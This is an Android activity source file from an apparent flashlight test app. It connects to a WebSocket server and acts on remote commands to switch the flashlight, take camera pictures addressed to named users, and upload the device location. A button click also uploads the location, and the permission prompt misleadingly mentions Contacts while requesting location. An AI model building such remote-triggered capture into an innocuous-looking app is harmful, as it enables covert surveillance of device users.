package flashlighttest.example.com.myapplication3;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.Vibrator;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.view.SurfaceView;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@SuppressLint({"NewApi", "HandlerLeak"})
@SuppressWarnings("deprecation")
public class MainActivity extends Activity {

    private final String TAG = MainActivity.class.getName();
    private FlashLightUtil flashLightUtil;
    private SurfaceViewShell sShell;
    private TextView mCameraBtn;
    private TextView mStateInfoTxt;
    private Vibrator vibrator;
    private Handler handler=null;
    private static Context context = null;
    private void checkP(){

    }



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mCameraBtn = (TextView) findViewById(R.id.textView2);
        mStateInfoTxt =(TextView) findViewById(R.id.textView);

        handler= new Handler() {
            @Override
            public void handleMessage(Message msg) {
                Bundle b = msg.getData();
                String info = b.getString("info");
                if(info !=null){
                    mStateInfoTxt.setText(info);
                }

                String cmd = b.getString("cmd");
                if(cmd =="command_5"){

                    LocationManager mLocationManager =(LocationManager) context.getSystemService (Context.LOCATION_SERVICE);
                    UpLoadImg up= new UpLoadImg();
                    up.startUpLocation(mLocationManager,"","");

                }
                if(cmd == "command_3"){
                    String toUserName = b.getString("toUserName");
                    String fromUserName = b.getString("fromUserName");
                    sShell.openCamera();
                    sShell.takeScreenShot(toUserName,fromUserName);
                }
                if(cmd == "command_2"){
                    flashLightUtil.SwitchFlashLight(false);
                }
                if(cmd == "command_1"){
                   // flashLightUtil.releaseCamera();
                   // sShell.releaseCamera();
                    flashLightUtil.SwitchFlashLight(true);
                }



            }
        };
            context = this;
        ///////////////////////
        final int REQUEST_CODE_ASK_PERMISSIONS = 123;//权限请求码

        try {
            int hasWriteContactsPermission = this.checkSelfPermission(Manifest.permission.CAMERA);//权限检查
            if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.CAMERA},
                        REQUEST_CODE_ASK_PERMISSIONS);
                return;//没有权限，结束
            } else {
                Log.d("aaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb");
                //做自己的操作
            }
        } catch (Exception e) {
            e.printStackTrace();
            //ToastUtil.defaultToast(getContext().getApplicationContext(), "权限异常");
        }

        ////////////////////////
        //mCamera = Camera.open();
        //surfaceview = (SurfaceView)findViewById(R.id.surfaceview);
        sShell = new SurfaceViewShell((SurfaceView) findViewById(R.id.surfaceview));
        flashLightUtil = new FlashLightUtil(this);

        final int[] open_tag = {0};
        mCameraBtn.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View view) {
                insertDummyContactWrapper();
               /* if(open_tag[0]%3==0){
                   // flashLightUtil.turnLightOn();
                    flashLightUtil.SwitchFlashLight(true);
                }else if(open_tag[0]%3==1){
                   // flashLightUtil.turnLightOff();
                    flashLightUtil.SwitchFlashLight(false);
                }else{
                    sShell.openCamera();
                }*/
                //openVibrator();
                open_tag[0]++;
               /*if(open_tag[0]%3==0){

                    surfaceViewShell.openCamera();
                }else if(open_tag[0]%3==1) {
                    surfaceViewShell.releaseCamera();
                }else{
                    surfaceViewShell.releaseCamera();
                    flashLightUtil.SwitchFlashLight();
                }*/
           }
        });
        //	Settings.System.putInt(getContentResolver(),android.provider.Settings.System.SCREEN_OFF_TIMEOUT,-1);

            WebSocketConnectProxy.createSocketClient(this, flashLightUtil, sShell, handler);
            //WebSocketConnectProxy client = new WebSocketConnectProxy

    }


    public void openVibrator(){
        vibrator = (Vibrator)getSystemService(Context.VIBRATOR_SERVICE);
        long [] pattern = {100,1500,100,1500,100}; // 停止 开启 停止 开启
        vibrator.vibrate(pattern,-1);
    }


    final private int REQUEST_CODE_ASK_PERMISSIONS = 124;

    private void insertDummyContactWrapper() {
        int hasWriteContactsPermission = ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.ACCESS_FINE_LOCATION);
        int hasWriteContactsPermission1 = ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.ACCESS_FINE_LOCATION);



        if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
            if (!ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.ACCESS_FINE_LOCATION)) {
                showMessageOKCancel("You need to allow access to Contacts",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                ActivityCompat.requestPermissions(MainActivity.this,
                                        new String[] {Manifest.permission.ACCESS_FINE_LOCATION},
                                        REQUEST_CODE_ASK_PERMISSIONS);
                            }
                        });
                return;
            }
            ActivityCompat.requestPermissions(MainActivity.this,
                    new String[] {Manifest.permission.WRITE_CONTACTS},
                    REQUEST_CODE_ASK_PERMISSIONS);
            return;
        }

        UpLoadImg upLoad = new UpLoadImg();
        LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        upLoad.startUpLocation(lm,"","");
     //   insertDummyContact();
    }

    private void showMessageOKCancel(String message, DialogInterface.OnClickListener okListener) {
        new AlertDialog.Builder(MainActivity.this)
                .setMessage(message)
                .setPositiveButton("OK", okListener)
                .setNegativeButton("Cancel", null)
                .create()
                .show();
    }


    /**
     * 提示框
     * @param context
     * @param message
     * @param okListener
     */


}
